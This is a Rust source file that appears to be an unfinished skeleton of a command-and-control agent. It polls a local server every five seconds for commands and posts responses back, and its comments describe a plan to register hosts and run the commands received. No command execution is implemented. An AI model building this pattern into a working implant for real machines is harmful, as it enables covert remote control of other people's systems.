//Get local IP and OS, make a POST request to [SERVER]/newHost and record identifier
//Constantly pull the page [SERVER]/IDENTIFIER/commands and POST results to [SERVER]/IDENTIFIER/responses

use reqwest::blocking::Client;
use std::{thread,time};

fn getCommands2(){
	let client = Client::new();
	let res = client.get("http://127.0.0.1:8080/hosts/Ubuntu1.1/commands").send().unwrap().text().unwrap();
    postResponse(&res);
}

fn runCommand(command:&str){
    let out = "test";
    postResponse(&out);
}

fn postResponse(response: &str){
    println!("{}",response);
    let text = format!("{{\"cmd_id\": \"1\",\"response\": \"{}\"}}",response);
    let client = reqwest::blocking::Client::new();
    let res = client.post("http://127.0.0.1:8080/hosts/Ubuntu1.1/responses").body(text).send().unwrap();
}

fn main(){
    let sleep_time = time::Duration::from_millis(5000);
    loop{
        getCommands2();
        thread::sleep(sleep_time);
    }
}
